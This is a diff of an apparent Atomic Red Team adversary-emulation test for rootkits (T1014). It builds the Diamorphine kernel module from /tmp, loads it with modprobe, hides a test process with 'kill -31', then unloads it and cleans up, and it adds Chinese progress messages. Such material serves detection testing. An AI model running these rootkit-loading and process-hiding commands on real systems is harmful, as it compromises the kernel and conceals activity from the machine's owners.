@@ -1,21 +1,29 @@
 Elevation Required;
 #pre
-cd /home/ubuntu/atomic-red-team-master/atomics/T1014/src/Diamorphine
+(which yum && sudo yum -y install zip) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y zip)
+cd /tmp
+unzip Diamorphine-master.zip
+cd Diamorphine-master
 make clean
 make
 #command
-cp /home/ubuntu/atomic-red-team-master/atomics/T1014/src/Diamorphine/diamorphine.ko /lib/modules/$(uname -r)/
+cp /tmp/Diamorphine-master/diamorphine.ko /lib/modules/$(uname -r)/
 depmod -a
 modprobe diamorphine
 #check
 ping -c 100 localhost >/dev/null & TARGETPID="$!"
+echo "后台运行测试进程："
 ps $TARGETPID
 kill -31 $TARGETPID
-if ps $TARGETPID; then echo "No such file or directory"; else echo "process hidden"; fi
+echo "使用diamorphine（rootkit）指定命令kill -31隐藏进程："
+if ps $TARGETPID; then echo "No such file or directory"; else echo "<process hidden>"; fi
 kill -63 1
 modprobe -r diamorphine
-if ps $TARGETPID; then echo "confirm success"; else echo "No such file or directory"; fi
+echo "移除diamorphine后再次查看测试进程："
+if ps $TARGETPID; then echo "<confirm success>"; else echo "No such file or directory"; fi
 kill $TARGETPID
 #cleanup
 rm -rf /lib/modules/$(uname -r)/diamorphine.ko
 depmod -a
+rm -rf /tmp/Diamorphine-master
+rm /tmp/Diamorphine-master.zip
